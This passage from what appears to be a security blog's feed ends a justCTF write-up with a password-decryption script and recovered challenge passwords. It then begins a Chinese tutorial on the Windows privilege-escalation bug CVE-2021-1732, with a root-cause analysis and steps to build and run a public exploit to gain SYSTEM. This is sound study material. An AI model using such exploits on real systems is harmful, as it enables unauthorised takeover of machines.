<code>accounts.vault</code>. Looking back at <code>accounts.amxx!handle_password_input</code>, we can find that the <code>words_to_str</code> function is also called after encryption:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// accounts.amxx</span><br><span class="line">new COD = 37;</span><br><span class="line"></span><br><span class="line">words_to_str(encoded[], encoded_len, bytes[], bytes_len)</span><br><span class="line">&#123;</span><br><span class="line">    new i;</span><br><span class="line">    while (i &lt; encoded_len)</span><br><span class="line">    &#123;</span><br><span class="line">        fmt(COD, encoded[i]);</span><br><span class="line">        add(bytes, bytes_len, fmt_result);  // strcat</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Obviously, <code>COD</code> should be a format string, but the decompilation result is wrong here. However, we can still guess the content of this format string through <code>encode3</code> and ciphertext. Take Rivit’s password ciphertext as an example: <code>0f5401c00a740b8d0dc10407081d0c8700ee</code>.</p><p>Because the ciphertext contains hex characters, starts with ‘0’, and contains many zeros, the format string should look like <code>%0?x</code>. In <code>encode3</code>, we can see the expression <code>random_value %= 4096</code>, which means every element in the list should be less than 0x1000 (4096). So the format string may be <code>%03x</code> or <code>%04x</code>, and ciphertext starts with ‘0’, so it can only be <code>%04x</code>.</p><p>Through the solving script below, we eventually get the flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode1</span>(<span class="params">username, password</span>):</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(password) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        password[k], password[k + <span class="number">1</span>] = password[k + <span class="number">1</span>], password[k]</span><br><span class="line"></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(password)):</span><br><span class="line">        password[i] ^= username[idx]</span><br><span class="line">        idx = (idx + <span class="number">1</span>) % <span class="built_in">len</span>(username)</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode2</span>(<span class="params">password</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(password)):</span><br><span class="line">        password[i] = rev_parts[<span class="string">&quot;%02x&quot;</span> % password[i]]</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode3</span>(<span class="params">password, password_len</span>):</span></span><br><span class="line">    random_value = <span class="number">0x301a</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(password_len):</span><br><span class="line">        tmp = password[i]</span><br><span class="line">        password[i] = (password[i] - <span class="number">1</span> - random_value) * invert(<span class="number">57005</span>, <span class="number">4096</span>) % <span class="number">4096</span></span><br><span class="line">        random_value = tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, password))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">order = <span class="number">0</span></span><br><span class="line">parts = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">256</span> <span class="keyword">and</span> <span class="built_in">len</span>(parts) != <span class="number">256</span>:</span><br><span class="line">    buf = <span class="string">b&quot;%08x&quot;</span> % i</span><br><span class="line">    hash_str = sha256(buf).hexdigest()</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">while</span> j &lt; <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">if</span> hash_str[j:j+<span class="number">2</span>] <span class="keyword">not</span> <span class="keyword">in</span> parts:</span><br><span class="line">            parts[hash_str[j:j+<span class="number">2</span>]] = order</span><br><span class="line">            order += <span class="number">1</span></span><br><span class="line">        j += <span class="number">2</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">rev_parts = &#123;<span class="string">&quot;%02x&quot;</span> % value: <span class="built_in">int</span>(key, <span class="number">16</span>) <span class="keyword">for</span> key, value <span class="keyword">in</span> parts.items()&#125;</span><br><span class="line"></span><br><span class="line">username = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;Pr0g4m3r&quot;</span>))</span><br><span class="line">cstr = <span class="string">&quot;0ec80d920582039e07950164007f02940e290e97038d08670cd108630bce02de0566079a02f4012c08ac04950aa60f0d0c81&quot;</span></span><br><span class="line">cipher = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cstr), <span class="number">4</span>):</span><br><span class="line">    cipher.append(<span class="built_in">int</span>(cstr[i:i+<span class="number">4</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">plain = decode1(username, decode2(decode3(cipher, <span class="built_in">len</span>(cipher))))</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, plain))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># justCTF&#123;4lm057_d34d_g4m3&#125;</span></span><br></pre></td></tr></table></figure><p>We can also get other users’ passwords:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Joe                joejoejoejoe</span><br><span class="line">Fragnatic          passw0rd</span><br><span class="line">Campers Death      hotdog87</span><br><span class="line">Wujek              plgurom!</span><br><span class="line">shw                topplayer</span><br><span class="line">Headshot Deluxe    winteriscoming</span><br><span class="line">fex                123123123</span><br><span class="line">L33t               headshot</span><br><span class="line">Rivit              admin1337</span><br><span class="line">Botman             q123123q</span><br><span class="line">rumcajs            zaq1@WSX</span><br><span class="line">Dredd              awp420awp</span><br></pre></td></tr></table></figure><p>I also wrote a runnable mod under 1.9-dev. It has the exact same cryptographic logic as <code>encoder.amxx</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;amxmodx&gt;</span><br><span class="line">#include &lt;celltrie&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">new Trie:parts;</span><br><span class="line"></span><br><span class="line">public set_parts()</span><br><span class="line">&#123;</span><br><span class="line">    new buf[32];</span><br><span class="line">    new hash[65];</span><br><span class="line">    new hexbuf[3];</span><br><span class="line">    new order = 0;</span><br><span class="line">    new i = 0;</span><br><span class="line">    new v;</span><br><span class="line"></span><br><span class="line">    parts = TrieCreate();</span><br><span class="line">    while (i &lt; 256 &amp;&amp; TrieGetSize(parts) != 256)</span><br><span class="line">    &#123;</span><br><span class="line">        formatex(buf, 31, &quot;%08x&quot;, i);</span><br><span class="line">        hash_string(buf, 3, hash, 64);</span><br><span class="line">        new j = 0;</span><br><span class="line">        while (j &lt; 64)</span><br><span class="line">        &#123;</span><br><span class="line">            formatex(hexbuf, 2, &quot;%c%c&quot;, hash[j], hash[j + 1]);</span><br><span class="line">            if (!TrieGetCell(parts, hexbuf, v))</span><br><span class="line">            &#123;</span><br><span class="line">                TrieSetCell(parts, hexbuf, order, 1);</span><br><span class="line">                order++;</span><br><span class="line">            &#125;</span><br><span class="line">            j += 2;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public plugin_init()</span><br><span class="line">&#123;</span><br><span class="line">    register_plugin(&quot;sim_encoder&quot;, &quot;1.0&quot;, &quot;in1t&quot;);</span><br><span class="line">    register_clcmd(&quot;say /reg&quot;, &quot;reg_func&quot;);</span><br><span class="line">    register_clcmd(&quot;passwd&quot;, &quot;handle_password_input&quot;);</span><br><span class="line">    set_parts();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public encode1(id, password[], password_len)</span><br><span class="line">&#123;</span><br><span class="line">    new username[32];</span><br><span class="line">    new username_len = get_user_name(id, username, 32);</span><br><span class="line"></span><br><span class="line">    new i = 0;</span><br><span class="line">    new j = 0;</span><br><span class="line">    while (i &lt; password_len)</span><br><span class="line">    &#123;</span><br><span class="line">        new var5 = password[i];</span><br><span class="line">        password[i] = username[j] ^ var5;</span><br><span class="line">        j++;</span><br><span class="line">        j %= username_len;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    new k = 0;</span><br><span class="line">    while (k + 1 &lt; password_len)</span><br><span class="line">    &#123;</span><br><span class="line">        password[k] ^= password[k + 1];</span><br><span class="line">        password[k + 1] ^= password[k];</span><br><span class="line">        password[k] ^= password[k + 1];</span><br><span class="line">        k += 2;</span><br><span class="line">    &#125;</span><br><span class="line">    return password_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public encode2(password[], password_len)</span><br><span class="line">&#123;</span><br><span class="line">    new var1;</span><br><span class="line">    new var2 = 0;</span><br><span class="line">    while (var2 &lt; password_len)</span><br><span class="line">    &#123;</span><br><span class="line">        TrieGetCell(parts, fmt(&quot;%02x&quot;, password[var2]), var1);</span><br><span class="line">        password[var2] = var1;</span><br><span class="line">        var2++;</span><br><span class="line">    &#125;</span><br><span class="line">    return password_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public encode3(password[], password_len)</span><br><span class="line">&#123;</span><br><span class="line">    new random_value = 0x301a;</span><br><span class="line"></span><br><span class="line">    new i = 0;</span><br><span class="line">    while (i &lt; password_len)</span><br><span class="line">    &#123;</span><br><span class="line">        random_value = password[i] * 57005 + random_value;</span><br><span class="line">        random_value += 1;</span><br><span class="line">        random_value %= 4096;</span><br><span class="line">        password[i] = random_value;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return password_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public encode_password(id, password[], len, output[], out_len)</span><br><span class="line">&#123;</span><br><span class="line">    new bytes_str[512];</span><br><span class="line">    new local_copy[256];</span><br><span class="line">    new new_len = len;</span><br><span class="line"></span><br><span class="line">    copy(local_copy, 255, password);</span><br><span class="line">    new_len = encode1(id, local_copy, new_len);</span><br><span class="line">    new_len = encode2(local_copy, new_len);</span><br><span class="line">    new_len = encode3(local_copy, new_len);</span><br><span class="line"></span><br><span class="line">    new j;</span><br><span class="line">    while (j &lt; new_len)</span><br><span class="line">    &#123;</span><br><span class="line">        add(bytes_str, 511, fmt(&quot;%04x&quot;, local_copy[j]), 4);</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    log_amx(bytes_str);    // output ciphertext to game console</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public handle_password_input(id)</span><br><span class="line">&#123;</span><br><span class="line">    new encoded[512];</span><br><span class="line">    new password[192];</span><br><span class="line"></span><br><span class="line">    new password_len = read_argv(1, password, 191);</span><br><span class="line">    encode_password(id, password, password_len, encoded, 511);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public reg_func(id)</span><br><span class="line">&#123;</span><br><span class="line">    client_cmd(id, &quot;messagemode passwd&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Later-Story"><a href="#Later-Story" class="headerlink" title="Later Story"></a>Later Story</h2><p>I’m so excited that the challenge author - <code>Rivit</code> - praised my writeup:</p><p><img src="/img/article/20220614/23.png" alt="challenge_author_reply"></p><p>What’s more interesting is that the author of <code>lysis-java</code> is also playing this CTF. There’s no wonder that their team got the first blood of <code>AMXX</code> so fast lol</p><p><img src="/img/article/20220614/24.png" alt="lysis_java_repo_with_discord_post"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-1732完全攻略</title>
      <link href="/2022/01/04/CVE-2021-1732%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/"/>
      <url>/2022/01/04/CVE-2021-1732%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2021-1732 是蔓灵花（BITTER）APT 组织在某次被披露的攻击行动中使用的 0day 漏洞，该<strong>高危</strong>漏洞可以在本地将普通用户进程的权限提升至最高的 SYSTEM 权限。受到该漏洞影响的 Windows 版本众多<sup>[1]</sup>，原始利用代码经过少量修改后甚至可以在（当时的）最新版 Windows 10 20H2 64 位全补丁环境进行提权。漏洞的利用样本最早在 2020 年 12 月 10 号就被安恒威胁情报中心捕获到<sup>[2]</sup>，在其与 MSRC 的通力合作下，今年 2 月初，MSRC 将漏洞修复。</p><p>目前在 github 上公布的可用 EXP 主要有两个版本，分别由 Kernel Killer<sup>[3]</sup> 和 KaLendsi<sup>[4]</sup> 编写，本文将使用<strong>前者</strong>的 EXP 来做分析和调试（Windows 版本为 Windows 10 Version <strong>1809</strong> for x64）。其本人也在看雪论坛发布了 EXP 开发的相关文章<sup>[5]</sup>（与 github 仓库中的 pdf 内容相同），本文会对 EXP 作者文章的技术细节进行补充，并对 EXP 代码进行近乎逐行的分析、注释。</p><p>作为第一次接触 Windows 内核漏洞利用的萌新（之前也只有些许 Windows 驱动开发经验），我将假设读者也和我一样初次尝试 Windows 内核漏洞利用复现，我会用最详尽的方式带你从零认知到完全理解 CVE-2021-1732。如果你正打算入门 Windows 内核，那么这篇文章将会给你提供一些静态分析及动态调试的技巧，如果你是这方面的老师傅，也欢迎对我说错的地方批评指正。总之，要是能在某些方面帮到你的话，就再好不过了。</p><br><h2 id="漏洞综述"><a href="#漏洞综述" class="headerlink" title="漏洞综述"></a>漏洞综述</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>用户态进程 p 在调用 CreateWindowEx 创建带有<strong>扩展内存</strong>的 Windows 窗口时，内核态图形驱动 win32kfull.sys 模块的 xxxCreateWindowEx 函数会通过 nt!KeUserModeCallback 回调机制调用用户态函数 user32!_xxxClientAllocWindowClassExtraBytes，其向内核返回用户态创建的窗口扩展内存。该返回值如何解释，由窗口对应 tagWND 结构体的 dwExtraFlag 字段规定。如果 dwExtraFlag 包含 0x800 属性，则返回值被视作<strong>相对内核桌面堆起始地址的偏移</strong>。攻击者可以 hook user32!_xxxClientAllocWindowClassExtraBytes 函数，通过一些手段使得 dwExtraFlag 包含 0x800 属性，然后直接调用 ntdll!NtCallbackReturn 向内核返回一个任意值。回调结束后，dwExtraFlag 不会被清除，未经校验的返回值直接被用于堆内存寻址（桌面堆起始地址 + 返回值），引发内存越界访问。随后攻击者通过一些巧妙的构造及 API 封装，获得内存越界读写能力，最后复制 system 进程的 Token 到进程 p 完成提权。</p><p>总的来说，漏洞是由 win32kfull!xxxCreateWindowEx 函数内一处由用户态回调导致的 flag 位设置与对应偏移设置不同步所导致的。</p><br><h3 id="漏洞特点-2"><a href="#漏洞特点-2" class="headerlink" title="漏洞特点[2]"></a>漏洞特点<sup>[2]</sup></h3><ul><li>攻击目标为最新版 Windows 10 操作系统<ul><li>在野样本攻击的是当时最新版 Windows10 1909 64 位操作系统（在野样本的编译时间为 2020 年 5 月）</li><li>在野样本适配了从 Windows10 1709 到 Windows10 1909 多个版本，且会只在 Windows10 1709 及以上版本中运行利用代码</li><li>原始利用代码经过少量修改后可在（当时的）最新版 Windows10 20H2 64 位全补丁环境进行提权</li></ul></li><li>漏洞质量高，利用手法精湛，稳定性好，动态检测难度大<ul><li>在野样本借助漏洞绕过了最新版 Windows 10 系统的内核地址空间布局随机化（KASLR）</li><li>本次漏洞不同于以往的 Win32k 漏洞，漏洞类型不是 UAF，整个利用过程不涉及堆喷射和内存重用，Type Isolation 缓解机制对其无效。在野样本在打开 DriverVerifier 验证器的情况下依然可以正常提权，无法通过开启内核池追踪检测到，动态检测难度大</li><li>在野样本的任意地址写入采用了漏洞特性结合 SetWindowLong 系列函数的手法，令人眼前一亮</li><li>在野样本借助 GetMenuBarInfo 实现任意地址读取，这种手法此前未被公开过，这体现出开发者精湛的利用编写水平</li><li>在野样本在构造出任意地址读写原语后，采用 DataOnlyAttack 的方式替换了当前进程的 Token，目前的内核缓解机制无法防御此类攻击</li><li>在野样本的漏洞利用成功率几乎为 100%</li><li>在野样本在完成利用后，将相关内核结构全部还原，整个过程不会对系统造成蓝屏影响，工作稳定</li></ul></li><li>使用谨慎，隐蔽性好<ul><li>在野样本在进行漏洞利用前对特定杀毒软件进行了检测</li><li>在野样本对当前操作系统版本进行了判断，低于 Windows 10 1709 版本的系统不会调用漏洞利用函数</li><li>在野样本从 2020 年 5 月完成编译，到 2020 年 12 月被发现，中间至少存活了 7 个月，这说明使用者在使用该漏洞时相当谨慎，间接体现出捕获此类隐蔽性样本的难度</li></ul></li></ul><br><h3 id="受影响的系统版本"><a href="#受影响的系统版本" class="headerlink" title="受影响的系统版本"></a>受影响的系统版本</h3><p>Windows Server, version 20H2 (Server Core Installation)<br>Windows 10 Version 20H2 for ARM64-based Systems<br>Windows 10 Version 20H2 for 32-bit Systems<br>Windows 10 Version 20H2 for x64-based Systems<br>Windows Server, version 2004 (Server Core installation)<br>Windows 10 Version 2004 for x64-based Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows Server, version 1909 (Server Core installation)<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows Server 2019 (Server Core installation)<br>Windows Server 2019<br>Windows 10 Version 1809 for ARM64-based Systems<br>Windows 10 Version 1809 for x64-based Systems<br>Windows 10 Version 1809 for 32-bit Systems<br>Windows 10 Version 1803 for ARM64-based Systems<br>Windows 10 Version 1803 for x64-based Systems</p><br><h3 id="漏洞利用效果"><a href="#漏洞利用效果" class="headerlink" title="漏洞利用效果"></a>漏洞利用效果</h3><p>平台：Windows 10 Version 1809 for x64</p><p><img src="/img/article/20220104/vulnerability_abstract/1.png" alt="1"></p><br><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="制作-Win10-1809-虚拟机"><a href="#制作-Win10-1809-虚拟机" class="headerlink" title="制作 Win10 1809 虚拟机"></a>制作 Win10 1809 虚拟机</h3><p>首先自然是需要一个 Win10 操作系统镜像，在 <a href="https://msdn.itellyou.cn/">MSDN 工具站</a> 上找到这个镜像并下载：</p><p><img src="/img/article/20220104/vulnerability_recurrence/build_win10_1809_vm/1.png" alt="1"></p><p>使用 VMware 创建一个新的虚拟机：</p><p><img src="/img/article/20220104/vulnerability_recurrence/build_win10_1809_vm/2.png" alt="2"></p><p>注册码不用填，选择一个要安装的版本，并另外注册一个非 admin 用户：</p><p><img src="/img/article/20220104/vulnerability_recurrence/build_win10_1809_vm/3.png" alt="3"></p><p>完成配置之前，需要注意，不论你的电脑配置有多好，请将<strong>处理器数和核心数都设置为 1</strong>，以排除多核复杂性对后面动态调试造成影响：</p><p><img src="/img/article/20220104/vulnerability_recurrence/build_win10_1809_vm/4.png" alt="4"></p><p>内存的话给个 2G 就行了，内存给得越大，快照的拍摄和还原就会越慢。之后就是等待 Win10 安装完毕。</p><br><h3 id="编译-exp"><a href="#编译-exp" class="headerlink" title="编译 exp"></a>编译 exp</h3><p>使用 Visual Studio 2019 创建一个新项目，选择 Windows 桌面向导，下一步：</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/1.png" alt="1"></p><p>取个项目名 ExploitTest：</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/2.png" alt="2"></p><p>应用程序类型选择<strong>桌面应用程序</strong>，并勾选空项目：</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/3.png" alt="3"></p><p>从 Kernel Killer 的 Github 仓库<sup>[3]</sup> 获取 CVE-2021-1732_Exploit.cpp，在 VS 侧面的源文件处右击，添加一个<strong>现有项</strong>，选择刚下载的 CVE-2021-1732_Exploit.cpp：</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/4.png" alt="4"></p><p>这里切换成 Debug x64：</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/5.png" alt="5"></p><p>双击打开 CVE-2021-1732_Exploit.cpp，然后 项目 -&gt;  ExploitTest 属性，再次确认配置的是 Debug x64：</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/6.png" alt="6"></p><p>将 C/C++ -&gt; 优化 -&gt; 优化 设置为 <strong>禁用</strong>：</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/7.png" alt="7"></p><p>将 C/C++ -&gt; 代码生成 -&gt; 运行库 设置为 <strong>多线程调试（MTd）</strong>，将运行库静态链接到可执行文件中，否则在虚拟机中运行时可能会报找不到 dll 的错。</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/12.png" alt="7.1"></p><p>将 链接器 -&gt; 调试 -&gt; 生成调试信息 设置为 <strong>生成经过优化以共享和发布的调试信息（/DEBUG:FULL）</strong>，这是为了后面用 ida 加载 pdb 时有符号。</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/8.png" alt="8"></p><p>将 链接器 -&gt; 高级 -&gt; 随机基址 设置为 <strong>否（/DYNAMICBASE:NO）</strong>，固定基址 设置为 <strong>是（/FIXED）</strong>，这是为了动调的时候方便下断点。</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/9.png" alt="9"></p><p><strong>应用</strong>后选择上方的 生成 -&gt; 生成解决方案，生成好后就能在项目所在的文件夹下看到一个 x64 文件夹：</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/10.png" alt="10"></p><p>进入其中的 Debug 文件夹，就能看到生成的 exe 和 pdb 了：</p><p><img src="/img/article/20220104/vulnerability_recurrence/compile_exploit/11.png" alt="11"></p><br><h3 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h3><p>将 ExploitTest.exe 拷贝到虚拟机中，再拷贝一个 64 位的 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">ProcessExplorer</a> 到虚拟机桌面：</p><p><img src="/img/article/20220104/vulnerability_recurrence/right_escalation_recurring/1.png" alt="1"></p><p><strong>右键以管理员身份运行</strong> ProcessExplorer，在上方空白处右键 -&gt; Select Columns，勾选上 Integrity Level，这样就能看到进程的权限了：</p><p><img src="/img/article/20220104/vulnerability_recurrence/right_escalation_recurring/2.png" alt="2"></p><p><strong>拍摄快照</strong>（这里务必拍摄快照，方便之后回退）后，双击运行 ExploitTest.exe，查看进程权限：</p><p><img src="/img/article/20220104/vulnerability_recurrence/right_escalation_recurring/3.png" alt="3"></p><p>在命令行界面按任意键让程序继续执行，再看进程权限，已提升为 system：</p><p><img src="/img/article/20220104/vulnerability_recurrence/right_escalation_recurring/4.png" alt="4"></p><p>可能一次不能成功（也有可能直接蓝屏），这个时候恢复一下快照，再重新尝试运行即可。</p><br><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><h3 id="Windows-桌面程序编程"><a href="#Windows-桌面程序编程" class="headerlink" title="Windows 桌面程序编程"></a>Windows 桌面程序编程</h3><p>这个部分是为没有进行过/不太熟练 Windows 桌面应用开发的读者而写的，我会用尽可能少的篇幅来让读者快速上手桌面开发 API 以及一些相关的结构体。如果你已经知晓了结构体 WNDCLASSEX 的 cbWndExtra 字段的作用，以及其与 GetWindowLong/SetWindowLong 系列 API 配合的含义，那么你可以选择跳到下个部分去。</p><p>和 <strong>2.2 节</strong> 操作相同，使用 Visual Studio 2019 创建一个桌面应用程序的空项目，切换成 Debug x64，在左侧源文件处右击，添加一个新建项，命名为 main.cpp，将下面的代码复制进去：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 